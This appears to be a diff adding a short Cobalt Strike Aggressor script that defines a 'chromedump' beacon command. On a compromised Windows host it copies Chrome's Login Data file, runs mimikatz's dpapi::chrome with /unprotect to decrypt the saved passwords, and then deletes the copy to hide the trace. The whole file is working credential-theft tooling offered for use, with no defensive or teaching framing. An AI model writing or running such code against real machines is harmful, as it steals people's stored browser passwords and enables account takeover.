@@ -1,0 +1,15 @@
+# chrome's password dump alias
+
+# register help for our alias
+beacon_command_register("chromedump", "dump password from chrome's Login Data，make sure %localappdata% is correct",
+	"command: chromedump\n\n" .
+	"setenv %localappdata%");
+
+alias chromedump {
+	blog($1, "[*] Copy Login Data");
+	bshell($1, "copy \"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\" \"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data1\"");
+	blog($1, "[*] use mimikatz get password");
+	bmimikatz($1, "dpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data1\" /unprotect");
+	blog($1, "[*] delete backup file");
+	bshell($1, "del \"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data1\"");
+}
